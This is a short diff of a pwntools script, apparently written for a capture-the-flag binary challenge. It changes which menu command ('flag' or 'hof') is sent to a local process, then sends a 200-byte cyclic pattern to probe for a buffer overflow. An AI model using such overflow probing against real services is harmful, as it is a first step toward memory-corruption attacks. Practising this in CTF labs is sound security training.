@@ -24,17 +24,17 @@ log.info('Create IO')
 #io = remote('', )
 io = process(executable)
 
-#log.info('Send Command flag')
-#io.sendlineafter('>>', 'flag')
+log.info('Send Command flag')
+io.sendlineafter('>>', 'flag')
 
-log.info('Send Command hof')
-io.sendlineafter('>> ', 'hof')
+#log.info('Send Command hof')
+#io.sendlineafter('>> ', 'hof')
 
 payload = cyclic(200)
 
 log.info('Send Payload')
-#io.sendlineafter('flag: ', payload)     #flag
-io.sendlineafter('name: ', payload)     #hof
+io.sendlineafter('flag: ', payload)     #flag
+#io.sendlineafter('name: ', payload)     #hof
 
 io.wait()
 
